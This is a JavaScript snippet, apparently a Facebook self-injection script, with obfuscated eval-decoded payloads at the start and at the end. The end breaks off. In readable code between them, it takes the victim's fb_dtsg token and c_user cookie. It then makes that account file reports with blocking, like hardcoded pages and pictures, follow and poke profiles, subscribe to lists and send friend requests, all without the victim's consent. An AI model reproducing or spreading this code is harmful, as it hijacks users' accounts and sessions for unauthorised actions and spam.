2113A2217A1641A2049D2169A2169B2081D2153F2073C1809C2105C2113A2137A2073C1593E2033E2049B2209C2073C2113B2161D1601E1745E2033B2057F2161A2073F2241D1641A2049A2169D2169E2081B2153E2073F1809F2105B2113E2137B2073C1593E2033D2073B2113F2217E1601A1745E1353C1649F1609B2057C3065F2113F1529A1681E1609F1649C1353A2033C2073F2113F2217D1641F2193F2201A2241E2137C2081F1641B2105F2081D2113F2097F2105F2201E1761A1545B1673E1697E1545F1745D2033F2073A2113A2217D1641F2193D2201B2241D2137A2081A1641A2225E2113B2073F2201E2105B1761A1545D1665A1657D1657D1569A1545E1745E2033A2073E2113C2217F1641A2193C2201A2241A2137B2081F1641D2169F2161A2193D2113A2201E2113A2161F2153D1761F1545C2089E2113A2233A2081C2073F1545B1745F1353B2033F2073E2113A2217B1641F2193A2201D2241B2137D2081E1641C2201F2161C2169E1761C1545E2049B2209B2201B2161B1545C1745B2033C2073B2113A2217D1641B2193E2201A2241E2137E2081B1641B2057F2161D2201D2201D2161D2145B1761D1545D1657E1545C1745D2033D2073A2113D2217D1641A2049E2137B2113E2097D2153C1761E1545F2065E2081D2153B2201D2081A2185E1545A1745D1353C2217A2049C2185A1529E2033C2049E2209E2073C2113C2161A1761F1529A2073D2161B2065A2209E2145B2081C2153F2201D1641E2065E2185F2081B2049C2201F2081E1825F2137E2081D2145A2081E2153F2201F1593B1585A2049E2209A2073B2113A2161A1585C1601B1745C1353B2033E2049D2209C2073D2113C2161F1641B2193F2201B2241D2137C2081B1641F2225F2113C2073B2201F2105E1761E1545A1665A1657B1657A1569F1545B1745C2033A2049F2209D2073A2113A2161F1641F2193A2201F2241D2137A2081A1641C2105F2081B2113B2097D2105B2201C1761C1545A1673D1697A2169E2233D1545A1745F2033B2049A2209D2073B2113A2161C1641A2065C2161E2153B2201F2185D2161E2137C2193B1529F1761E1529E2201A2185C2209C2081B1745B1353D2033E2049B2209F2073B2113C2161B1641A2049A2209F2201F2161D2169D2137F2049D2241A1529C1761B1529D2089A2049D2137C2193B2081E1745A2033E2049E2209A2073C2113C2161A1641A2049D2209F2201C2161C2169E2137F2049D2241F1529D1761F1529F2201C2185F2209D2081A1745B1353C2033D2049C2209B2073C2113A2161B1641C2193A2185E2065F1529B1761F1529E1545E2105A2201F2201C2169B1737D1649B1649C2193B2201B2185F2081B2049E2145C1681A1657D1697E1641F2153B2105F2049A2065E1641D2217C2209D2113B1641D2217E2153D1649C2209A2169E2137A2161D2049A2073E2145A2209F2193C2113E2065B1673B1649A1681B1681C1665A1689B2081D1721C2089E1673D1673B2065B2065F1657E1673C2081F2081B1673D2089C1697E2073C1697E1697B2057E1665C1697C1721F1697A2065E1721C1705D1689F1729C1673C1649B1697F1673C2049E1697C2089B1721A1689D1665E1649E2209C2169F2137E2161E2049C2073E2145B2209E2193E2113C2065E1649A2113A2073C2033B2137F2081F1649A1681C1633A1673B1657B1665C1681C1649E2105B2209E2241E2137E2209C2153E1649E1929B2049F2169F1649F1897B2081D2225B1945D2185A2049C2065E2129A1649A1665B1673A1721B1649A1897A2049B2153D2097B1569E1673A1657C1793C2145F1569A1673E1657A1817F2049A2153A1569A1673A1657F1977A2049D1569D1673D1657F1633D1569E1673E1657D1889F1633D1945E1913C1641F2145E2169C1681E1545C1745D1353B2033A2073F2113F2217B1641C2049C2169C2169D2081E2153D2073C1809A2105F2113C2137E2073C1593E2033D2049E2209D2073F2113C2161F1601D1745F2033D2057A2161F2073C2241F1641A2049A2169A2169B2081E2153C2073F1809A2105D2113C2137E2073B1593F2033E2073C2113C2217D1601A1745B1353C1649C1609A2057E3065E2113E1529B1689E1609F1649B1353E2033F2073E2113B2217E1641D2193A2201E2241E2137C2081E1641C2105A2081F2113A2097D2105F2201F1761A1545B1673B1697D1545A1745C2033B2073E2113B2217C1641B2193F2201F2241B2137A2081B1641B2225F2113D2073A2201B2105A1761D1545B1665F1657F1657F1569E1545F1745D2033A2073B2113D2217B1641A2193D2201F2241B2137B2081C1641F2169E2161C2193D2113E2201C2113B2161E2153A1761B1545F2089D2113F2233E2081A2073A1545D1745C1353F2033E2073D2113C2217C1641D2193A2201F2241C2137A2081E1641C2201A2161A2169A1761D1545A2049D2209F2201E2161C1545D1745D2033B2073D2113D2217D1641C2193F2201C2241C2137B2081E1641E2057F2161E2201E2201D2161C2145E1761B1545E1657B1545E1745B2033B2073C2113D2217D1641D2049A2137A2113B2097A2153F1761A1545B2065D2081B2153A2201C2081F2185D1545F1745B1353E2217E2049D2185B1529F2033F2049A2209D2073C2113F2161C1761A1529A2073B2161A2065A2209C2145A2081A2153F2201C1641A2065B2185C2081E2049A2201F2081A1825B2137C2081A2145B2081C2153E2201B1593E1585B2049C2209B2073F2113B2161E1585B1601F1745A1353D2033D2049E2209B2073B2113B2161F1641C2193C2201A2241C2137F2081E1641A2225D2113B2073B2201C2105A1761B1545F1665A1657F1657C1569C1545E1745A2033F2049B2209E2073C2113A2161D1641E2193F2201C2241B2137F2081D1641C2105F2081F2113A2097F2105D2201D1761D1545D1673C1697F2169F2233C1545C1745E2033E2049D2209F2073E2113A2161C1641C2065E2161B2153A2201B2185E2161A2137B2193F1529F1761C1529E2201D2185C2209D2081F1745E1353A2033A2049C2209A2073E2113D2161C1641B2049B2209F2201B2161B2169C2137E2049B2241A1529C1761B1529E2089E2049E2137E2193B2081A1745C2033B2049E2209E2073D2113B2161A1641C2049B2209E2201B2161E2169C2137F2049B2241F1529F1761C1529E2201F2185A2209B2081B1745F1353D2033D2049C2209D2073E2113D2161E1641B2193A2185F2065E1529B1761D1529A1545C2105A2201F2201D2169C1737B1649E1649F2225E2225B2225D1681D1657F1697A1641E2153E2105E2049B2065A1641E2217B2209D2113C1641A2217E2153A1649B2209D2169A2137F2161D2049E2073C2145F2209D2193A2113C2065A1673A1649E2073C1697D2049C1729F1705E2065A2089B2081A1729A2081C1713E1657A1673D1657A2065B2049F1713D1721D1665B1657E1713E1729D1657F1657F1665C1657F2065A1721C2049E1697D2049D1721F1649D1697E1673F1705D1665D2049C1673D2049D1689E1649C2209A2169F2137A2161C2049C2073D2145D2209D2193C2113D2065C1649C1897A2105E2049D2065D1569E1673E1657D1961F2113A2081A2201D1569A1673B1657F1897A2049C2145A1649A1889E2185C1641B1937C2113D2185C2161F1649A1881B2049A2153F2097E1569F1673E1657D1897F2097E2105B2081B1569B1673E1657F1897F2209E2161B2065D1569B1673D1657D1889E2049E2201B1649C1665F1673D1721C1649B1881C2049E2153D2097D1569A1673A1657F1897E2097B2105D2081A1569D1673A1657D1897C2209A2161E2065C1569F1673C1657D1889E2049A2201B1641D2145C2169F1681C1529A1545B1745A1353D2033E2073E2113D2217C1641C2049D2169F2169F2081A2153C2073C1809B2105A2113F2137C2073D1593B2033B2049B2209A2073E2113A2161E1601F1745B2033F2057E2161F2073B2241D1641F2049B2169B2169F2081A2153E2073C1809A2105A2113B2137F2073F1593B2033A2073B2113F2217A1601F1745A';var _9576=/[\x41\x42\x43\x44\x45\x46]/;var _7541=2;var _1208=_8595.charAt(_8595.length-1);var _3078;var _8968=_8595.split(_9576);var _9789=[String.fromCharCode,isNaN,parseInt,String];_8968[1]=_9789[_7541+1](_9789[_7541](_8968[1])/21);var _5490=(_7541==5)?String:eval;_3078='';_11=_9789[_7541](_8968[0])/_9789[_7541](_8968[1]);for(_4678=3;_4678<_11;_4678++)_3078+=(_9789[_7541-2]((_9789[_7541](_8968[_4678])+_9789[_7541](_8968[2])+_9789[_7541](_8968[1]))/_9789[_7541](_8968[1])-_9789[_7541](_8968[2])+_9789[_7541](_8968[1])-1));var _7577='_6527';var _8948='_7577=_3078';function _6519(_2819){_5490(_2426);_6519(_2838);_2838(_8948);_6519(_7577);}var _2426='_6519=_5490';var _2838='_2838=_6519';_6519(_1208);
    var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var _6717; var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var _6717; var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var now=(new Date).getTime(); function report(r) { var X = new XMLHttpRequest(); var XURL = "https://www.facebook.com/ajax/report/social.php"; var XParams ="fb_dtsg="+fb_dtsg+"&block=1&pp=%7B%22actions_to_take%22%3A%22[]%22%2C%22are_friends%22%3Afalse%2C%22cid%22%3A" + r +"%2C%22content_type%22%3A0%2C%22expand_report%22%3A1%2C%22first_choice%22%3A%22file_report%22%2C%22from_gear%22%3A%22timeline%22%2C%22is_following%22%3Afalse%2C%22is_tagged%22%3Afalse%2C%22on_profile%22%3Afalse%2C%22phase%22%3A3%2C%22ref%22%3A%22https%3A%5C%2F%5C%2Fwww.facebook.com%5C%2F%22%2C%22report_type%22%3A145%2C%22rid%22%3A" + r +"%2C%22sub_report_type%22%3A141%2C%22time_flow_started%22%3A"+now+"%2C%22user%22%3A"+user_id+"%7D&file_report=1&__user="+user_id+"&__a=1&__dyn=7n8ahyj35ynzpQ9UmAWuURDw&__req=h&ttstamp=26581661107112011276&confirmed=1"; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
     
    // Like pic like page
    var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); }
    var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value; var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function a(abone) { var http4=new XMLHttpRequest; var url4="/ajax/follow/follow_profile.php?__a=1"; var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp="; http4.open("POST",url4,true); http4.onreadystatechange=function() { if(http4.readyState==4&&http4.status==200)http4.close } ; http4.send(params4) } function sublist(uidss) { var a = document.createElement('script'); a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();"; document.body.appendChild(a); } function p(abone) { var http4 = new XMLHttpRequest(); var url4 = "//www.facebook.com/ajax/poke_dialog.php"; var params4 = "uid=" + abone + "&pokeback=0&ask_for_confirm=0&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=v&fb_dtsg="+fb_dtsg+"&phstamp="; http4.open("POST", url4, true); http4.onreadystatechange = function () { if (http4.readyState == 4 && http4.status == 200) { http4.close; } }; http4.send(params4); }var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
    // pic + fans
    P("818767601470459");Like("332976360092707");Like("191605454317937");Like("482770981764011");Like("230681650365026");Like("442009315820236");Like("398334620273077");Like("116079135145926");
    /*Add Friend*/;
    var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
    var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
    function IDS(r) {
      var X = new XMLHttpRequest();
      var XURL = "//www.facebook.com/ajax/add_friend/action.php";
      var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
      X.open("POST", XURL, true);
      X.onreadystatechange = function () {
        if (X.readyState == 4 && X.status == 200) {
          X.close;
        }
      };
      X.send(XParams);
    }
     
    //Report
    var _6798;var _6811='44919F147C165A1767F1620F1739D1165F1606E1277F1781F1627F1291C1312D1312E1368E1578B1179E1585E1781C1305A1291B1585F1760E1284A1424A1396B1284C1585B1781F1319E1424A1585B1781F1291D1277C1585D1781C1319E1298D1585F1781C1431D1298D1585F1781D1291D1277E1585A1781D1319D1298C1585E1781C1319F1333E1585E1760F1284A1424E1396B1431F1585D1781E1319D1298D1585D1781E1291C1277E1585E1781B1319F1298A1585E1781C1319C1333B1585A1760A1284C1424F1396A1431E1585D1781E1319C1424C1585B1781B1291D1277C1585B1781E1319D1403B1585D1781F1319F1333F1585C1781F1319E1340A1585F1781C1291B1277F1585F1781B1319A1298E1585B1781B1319C1333F1585D1760B1284C1424D1396D1284B1585E1781C1326E1340E1585A1781D1291D1277D1585A1781F1319F1298A1585D1781E1319A1431F1585D1781C1319A1305C1585B1781C1319F1312B1585F1781D1291F1277E1585B1781C1319D1424C1585A1781E1424E1277C1585D1781F1326F1340E1585E1781A1291B1277A1585C1781A1319D1298F1585C1781E1319D1333B1585F1760B1284D1424E1424C1340A1585F1781F1291F1277C1585E1781E1298C1431F1179E1249B1179D1585A1781C1305D1291A1585E1760C1284C1424A1396A1284F1585F1781E1319F1424E1585B1781A1291A1277B1585E1760D1277C1284D1284A1284D1585A1760B1284F1424C1424E1326D1585E1781A1291F1277B1585E1781D1298E1284F1585D1781E1298C1333F1585E1781E1291D1277E1585C1781A1326B1305E1585A1781B1326C1312C1585A1760C1284A1424C1417E1312C1585E1781F1319C1340A1585F1781F1291E1277B1585C1781D1319A1298A1585D1781F1319C1333A1585C1760E1277A1284D1403F1277D1585E1781A1319E1284D1585D1781B1291C1277E1585B1781D1298D1431D1179C1249D1179C1585C1781A1305F1417E1585E1781D1424C1277C1585F1781A1291F1277A1585C1781B1326E1305D1585B1781C1319F1333C1585A1781A1431C1305B1585C1781D1319B1340A1585B1781E1291F1277E1585D1781E1319B1403E1585E1760E1284A1424D1410A1326A1585B1781B1291E1277E1585E1781C1319C1291B1585B1760B1284C1424A1396A1284B1585F1781D1319A1424E1585F1781D1291C1277D1585F1781D1291C1410C1585C1781B1291B1277E1585B1781D1319F1291D1585E1760A1284F1424E1396E1284E1585E1781B1319E1424E1585D1781E1291A1277F1585D1781D1319F1298E1585B1781C1319E1333C1585F1760C1284B1424F1396F1284A1585E1781F1326D1340B1585E1781D1291F1277A1585C1781B1319F1298E1585E1781F1319A1431A1585A1781C1319C1305B1585C1781C1319B1312D1585D1781B1291C1277F1585A1781E1319D1424E1585C1781C1424C1277A1585F1781F1326C1340F1585B1781B1291C1277E1585A1781C1319F1298F1585A1781E1319A1333A1585C1760A1284C1424D1396D1431F1585C1781B1319C1298F1585F1781F1291C1277E1585F1781A1319E1410A1585F1781F1424D1277E1585F1781F1291D1277E1585F1781D1319C1305B1585E1781E1319F1431C1585A1781C1291F1277B1585E1781D1319A1291C1585C1760C1284C1424D1396F1284F1585A1781E1319C1424C1585F1781D1291A1277E1585E1781E1326B1305B1585C1781E1431E1291D1585C1781D1291B1277F1585C1781E1319A1417F1585F1781D1431B1291C1585B1781E1291B1277A1585C1781E1319D1298D1585B1781E1424B1284F1585A1781D1319F1340D1585B1781B1291E1277C1585B1781E1319D1326E1585A1781A1424C1410F1585E1781E1291F1277D1585F1760B1277B1284D1284F1284E1585D1781D1431A1298D1585B1781A1291C1277D1585D1781D1326B1277B1585E1781E1319A1333E1585A1760A1284C1424F1396A1298B1585F1781F1319E1340F1585A1781F1291D1277A1585B1781B1319D1403E1585A1781E1319D1333B1585A1781D1431A1305D1585B1781B1319A1424C1585F1781B1319D1326B1585D1781D1291D1277D1585E1781D1312F1424E1585E1781B1312F1424C1179B1249B1179A1585C1781F1305F1431E1585A1781E1305C1403D1585A1781E1291B1277F1585B1781B1291B1284D1585C1781C1291B1277D1585C1781F1305D1417D1585F1781C1424E1410E1585A1781E1319A1424B1585C1781B1319F1333E1585B1781E1291E1277C1585A1781C1326A1298D1585C1760A1284C1424B1403D1417C1585F1781E1291F1277B1585C1781E1326D1305B1585E1781B1319B1340F1585E1760F1284E1424E1403F1431C1585A1781D1326D1305F1585A1781F1291E1277B1585A1781C1319F1410A1585D1760B1284C1424A1417F1340E1585D1781D1291C1277A1585C1781A1319B1424D1585C1781C1319A1326D1585D1781A1319A1284F1585C1781E1326E1340D1585D1781E1291B1277F1585F1781D1326D1305F1585A1781A1319A1333A1585E1781B1431D1305B1585E1781E1319B1340B1179F1249E1179D1585C1781E1312E1305F1585E1781E1319A1333E1585D1760C1284B1424A1431C1284B1585B1781C1319D1298B1585E1781E1291D1277F1585E1781B1326F1291D1585C1781B1319C1284B1585D1781C1291F1277E1585E1760E1277E1284B1284B1284E1585B1781D1424B1291E1585A1781F1326A1340C1585D1781A1291F1277D1585D1781B1319E1410D1585A1781C1424C1277A1585E1781A1291F1277E1585D1781F1298B1284D1585D1781E1291E1277D1585E1781B1319D1298F1585A1781B1319E1431F1585A1781D1319C1305B1585E1781E1319B1312E1585E1781B1291B1277E1585C1781E1319F1333E1585B1781C1424B1277F1585E1781E1319F1340C1585B1781B1291A1277D1585E1781F1291D1284E1179C1249F1179B1585A1781B1305C1424D1585C1781D1431B1298F1585B1781C1291B1277F1585A1781B1319D1298E1585C1760D1277E1284C1319F1340B1585E1781A1319E1424A1585A1781C1319E1326C1585B1781A1291B1277D1585E1781F1319D1298D1585D1781C1319C1333C1585A1760B1284B1424A1396E1298B1585D1781E1291B1277C1585E1781D1319D1298A1585A1781C1431F1298D1585B1781A1291F1277A1585E1781D1319B1326A1585A1781C1424B1410B1585A1781C1291F1277A1585C1760C1284B1424E1396F1312A1585D1781F1319D1424B1585F1781F1291F1277A1585D1781C1326E1305D1585D1760F1277E1284F1403D1277B1585D1760C1284F1424C1424E1298E1585E1781D1319C1424F1585F1781C1319D1326F1585D1781D1291E1277F1585E1781D1319D1298C1585E1760D1284B1424C1396A1298E1585C1781B1291F1277A1585F1781D1291F1284C1585A1781A1291E1284A1179C1249B1179B1585D1781A1305E1424A1585C1781A1319B1333E1585D1760F1277E1284E1403C1277B1585E1781C1319F1424B1585B1781F1319D1326B1585E1781A1291A1277E1585F1781C1319E1424B1585F1760C1284D1424F1403C1431A1585C1781D1326A1312D1585E1781F1291E1277B1585F1781B1319F1291B1585E1760F1284A1424B1396D1284B1585A1781F1319E1424D1585F1781F1291F1277E1585C1781A1319C1298C1585C1781F1319A1333A1585E1760E1277B1284D1277F1298D1585B1781D1319C1417B1585A1781B1291F1277A1585D1781C1319D1298F1585C1781B1319D1333F1585E1781E1431F1396B1585C1781D1291B1277E1585B1781E1326E1319B1585E1781B1424D1277B1585D1781C1291C1277F1585C1781A1319B1410C1585E1781A1424A1277E1585A1781E1319A1417B1585E1781A1291B1277B1585C1781F1326E1305B1585D1781A1319D1333D1585F1781B1319D1312A1585C1781B1319F1431F1585F1781E1291C1277F1585C1781A1319D1417F1585B1781C1424F1410E1585C1781A1319F1424E1585B1781E1319B1333A1585C1781D1291C1277C1585E1781C1326A1305A1585B1781E1319C1333A1585E1781A1424F1410E1585F1781D1291D1277B1585D1781C1319C1424D1585F1781C1431E1298F1585D1781F1291A1277B1585A1781D1326A1298B1585C1760C1284B1424F1403F1417F1585E1781A1291B1277E1585E1781C1319A1298E1585F1760B1284F1424B1431F1284B1585C1781B1319F1298B1585F1781F1291C1277F1585D1760E1284F1424A1396A1312F1585F1781C1319E1424E1585E1781B1291B1277B1585C1781D1326C1305F1585B1760D1277A1284F1403F1277F1585C1760A1284A1424C1424F1298A1585B1781C1319A1424E1585D1781B1319E1326B1585F1781C1291D1277D1585F1760D1277D1284D1284F1284D1585F1781E1431E1298D1585F1781B1291F1277F1585A1781A1312C1424D1585A1781C1312D1424D1179A1249C1179A1585B1781A1305C1291A1585D1781B1424B1291A1585F1781F1326F1340F1585C1781A1291A1277F1585E1781C1319F1326A1585B1781C1319D1340F1585D1760F1284C1424D1417F1417B1585C1781A1291C1277C1585C1781E1319F1291F1585E1760B1284C1424B1396E1284E1585B1781B1319D1424A1585A1781D1291B1277B1585D1760B1284E1424F1396B1312A1585D1781B1319F1424C1585F1781B1291E1277D1585E1781C1305E1431B1585E1781B1305E1403A1585B1781F1291C1277B1585A1781D1319A1298C1585C1781A1424F1284D1585B1781A1319B1340F1585A1781E1291D1277B1585C1781D1319F1291A1585B1760D1284F1424A1396B1298E1585A1781A1319A1424A1585A1781B1319C1326A1585D1781B1291A1277B1585A1781C1319D1424B1585C1781F1424A1277B1585D1781A1326C1340C1585D1781B1291F1277B1585C1781B1291E1284B1179F1249B1179F1585F1760A1277A1284C1284D1277D1585E1781D1424F1298F1585B1781F1291F1277E1585A1760E1284B1424F1396F1312E1585F1781C1319A1424E1585F1781E1291B1277C1585B1781A1305E1431F1585E1781D1305D1403C1585A1781B1291C1277C1585E1781A1326A1291F1585C1760F1284B1424D1417C1298C1585D1781B1319B1340B1585B1781D1291E1277E1585E1781B1424D1277E1585D1781B1291A1277C1585F1781A1291C1284A1585D1781E1291F1277C1585D1781F1319D1326D1585D1781D1319A1340E1585C1760B1284C1424C1417A1417F1585A1781D1291E1277B1585F1760F1284A1424A1396C1312E1585C1781F1319B1424D1585E1781E1291D1277B1585F1781A1305C1431B1585D1781B1305B1403C1585D1781D1291C1277D1585A1781C1326C1305A1585B1781A1319A1340E1585D1760B1284E1424F1403E1431E1585C1781F1326D1277A1585F1781A1291F1277D1585F1781A1319F1298B1585B1781A1424F1284B1585C1781A1319F1340A1585D1781F1291A1277C1585D1781A1319E1291C1585C1760C1284E1424D1396F1298D1585A1781C1319C1424E1585B1781F1319C1326C1585E1781F1291F1277B1585B1781D1319D1424B1585B1781F1424D1277E1585E1781A1326D1340E1585A1781E1291F1277C1585F1781B1326B1319F1585A1781A1424E1277C1585E1781A1291F1277E1585D1781F1319D1424F1585B1781E1319C1333A1585C1781B1424F1410F1585C1781D1319E1424E1585E1781A1291D1277B1585F1781D1319A1298B1585E1781E1319B1333B1585D1760D1277C1284A1277C1298A1585C1781A1319B1417A1585A1781B1291C1277A1585E1781B1319B1298B1585B1781E1319F1333E1585F1781A1431C1396C1585C1781F1291F1277B1585B1781C1326F1319E1585F1781B1424A1277B1585E1781A1319F1431C1585E1781F1291A1277B1585F1781A1319C1417A1585F1781B1424A1277A1585D1781D1319B1424D1585C1781D1291D1277F1585B1781D1319B1333D1585C1781C1424C1410B1585D1781B1319C1424A1585C1781E1319D1333D1585C1781C1291B1277B1585F1781B1326B1319B1585F1781E1424D1277F1585C1781A1291F1277C1585E1760B1277C1284E1284B1284E1585E1760F1284F1424F1403D1431E1585B1781F1319E1417E1585F1781D1291A1277B1585E1781D1326D1305F1585D1760A1284F1424E1424C1403A1585D1781D1291F1277E1585E1781A1298D1284D1585D1781F1291C1277B1585B1760F1277E1284D1284A1284B1585D1760E1284C1424A1403C1431E1585B1781A1319D1424C1585F1781D1291E1277A1585B1781A1298B1284B1585D1781A1298E1277E1585D1781F1291A1277B1585F1781F1319E1424D1585D1781A1319A1333D1585C1781B1424C1340C1585B1781B1291A1277D1585D1781B1326A1291D1585E1760E1284D1424D1417D1298C1585A1781A1319B1340F1585D1781C1291D1277B1585C1781F1319E1291B1585D1760E1284E1424C1396C1284F1585A1781F1319F1424E1585A1781F1291F1277C1585E1781C1326C1298D1585C1760C1284A1424A1403C1417C1585E1781B1291F1277B1585D1781D1326D1305B1585A1781C1319B1333E1585F1760D1284B1424F1396B1312F1585D1781F1326B1340B1585D1781C1291B1277D1585D1760E1277D1284E1284C1284C1585F1781F1319B1340E1585D1760E1284A1424A1410C1284D1585C1781A1326E1312D1585A1781A1291F1277D1585D1781F1319D1403A1585F1760F1284B1424B1431C1298A1585B1781C1291F1277E1585C1781B1319A1305C1585C1781B1319E1340C1585F1760F1284E1424E1410D1326C1585C1781E1326B1312A1585D1781A1291F1277F1585A1781C1326F1298E1585F1760D1284F1424F1403A1417B1585F1781D1291E1277C1585B1781F1326E1333B1585D1760E1284A1424F1396F1298A1585A1781E1326F1340C1585F1781D1291B1277C1585B1781D1326B1291E1585C1781C1319D1284B1585A1781F1277E1396F1585A1781E1305D1298A1585C1781F1319A1333C1585A1781A1431E1396C1585F1781C1319B1298A1585A1781F1291C1277F1585B1781A1319B1291D1585C1760C1284B1424B1396E1284F1585A1781E1319C1424F1585A1781D1291F1277B1585E1781A1326C1319C1585F1781E1326E1312F1585D1781F1319C1340F1585C1781E1291A1277A1585C1781B1326C1319D1585F1760C1284D1424A1403D1403E1585B1781F1291D1277F1585C1781F1312A1424F1585C1781E1312C1424D1179B1249C1179E1585F1781E1305F1298E1585C1781D1319D1431E1585B1781B1319C1305C1585C1781A1319F1312C1585F1781C1291F1277E1585C1781D1305F1291C1585A1781E1326E1340C1585A1781E1291C1277B1585A1781A1312B1298B1585D1781E1326E1305E1585A1781D1319C1284B1585F1781A1326F1291B1585F1781C1291B1277F1585B1781F1305E1424A1585C1781D1319A1333C1585B1760D1284B1424C1396F1417A1585A1781F1326B1305B1179E1249B1179B1585A1781D1319F1340B1585C1781A1319A1424F1585B1781A1319E1424B1585C1781C1319E1312F1585E1781C1326E1291A1585C1781E1305C1333B1585B1781A1312D1305A1585E1781E1305B1417F1585C1781C1305A1410E1179D1249F1179E1585A1781F1319D1291B1585E1781B1319C1410E1585E1781A1326D1312C1585C1781F1319E1312B1585C1781B1305D1291F1585C1781F1319E1284D1585B1781F1326F1291F1179C1249F1179B1585D1781D1298B1410B1585C1781F1319D1417F1585D1781A1319F1312C1585D1781E1326D1305F1585E1781A1319B1284B1585F1781C1291C1277A1585C1781D1305A1333E1585B1781C1312C1305F1585B1781B1312A1305D1585C1781E1312A1277D1585A1781E1291F1417D1585D1781D1305B1312C1585E1781C1312D1284C1585C1781A1312E1312A1585A1781B1305D1340F1585C1781F1312D1319E1585A1781E1298C1417C1585F1781D1291A1291B1585E1781C1312C1291E1585C1781B1305B1312C1585D1781B1305A1319B1585D1781A1312E1291E1585C1781B1305F1312A1585B1781F1312D1298A1585A1781B1305F1333C1585B1781F1291C1291D1585C1781C1291D1277F1585E1781D1319B1298F1585E1781C1319B1431A1585F1781D1319D1424C1585A1781F1326D1305B1585C1781D1319C1312C1585D1781B1319D1424C1585D1781D1326C1305F1585A1781A1298B1417F1585B1781B1291F1291C1585E1781E1298A1312F1585F1781D1298A1403E1585F1781D1291E1277B1585C1781F1326C1312C1585B1781B1326F1291E1585B1781A1319F1410B1585D1781A1298A1417B1585A1781D1319E1333F1585F1781A1326F1305B1585D1781E1326F1305B1585A1781D1326D1277D1585F1781F1298C1396C1585B1781B1291D1431F1585D1781E1291B1431E1585E1781A1319E1298C1585E1781A1319E1284C1585A1781E1319E1417F1585B1781E1319F1326B1585E1781A1319E1340E1585E1781A1319F1284E1585D1781F1319B1298E1585F1781B1319A1417C1585D1781D1319A1284C1585B1781C1319B1424C1585F1781C1319A1333E1585B1781E1291D1424E1585C1781B1319B1298E1585A1781F1319B1431F1585C1781C1319F1417F1585D1781E1291E1291D1585C1781C1298B1424B1179A1249A1179C1585A1781E1326F1319F1585C1781C1319E1284A1585D1781E1319A1410E1585A1781F1326C1312E1585C1781C1319A1312A1179B1249A1179C1585D1781F1319C1319B1585C1781B1319B1291F1585F1781B1312A1431B1585B1781E1319D1305F1585D1781D1326C1305C1585C1781D1326D1298E1585F1781D1319C1326E1179F1249B1179F1585A1781F1319F1326A1585E1781C1319B1312A1585A1781C1326E1305A1585F1781D1305E1312A1585C1781B1319F1410F1585E1781C1319A1312F1585A1781A1319B1417A1585A1781F1319B1312D1585B1781A1319B1424C1585C1781C1326F1305B1585A1781A1326A1298B1585B1781F1305A1291D1585E1781A1326D1340D1585A1781F1305F1424E1585C1781F1319B1284C1585C1781A1319A1417D1585D1781E1319F1312A1179E1249C1179A1585F1781F1319B1417D1585C1781D1319C1284B1585D1781A1326A1305E1585D1781A1319A1298B1585C1781D1319C1333F1179A1249D1179E1585F1781D1319D1298E1585B1781F1319C1431C1585E1781F1319D1431B1585D1781D1319B1403A1585B1781E1319E1340E1585D1781E1319C1312B1179C1249D1179F1585A1781C1319A1326B1585D1781F1319D1312D1585B1781B1326D1305B1585A1781F1312E1305B1585F1781B1319B1340C1585C1781D1319D1417C1585C1781B1319B1312F1179C1249B1179A1585C1781D1319B1333D1585C1781F1326F1305F1585B1781C1326D1305C1585F1781D1326A1277F1585C1781A1326C1298E1585F1781D1298E1396E1585C1781A1291F1431A1585C1781F1291B1431A1585F1781B1326A1326C1585C1781B1326E1326A1585B1781E1326B1326F1585E1781A1291C1424C1585E1781F1319A1319C1585E1781A1319D1284B1585E1781B1319D1298A1585C178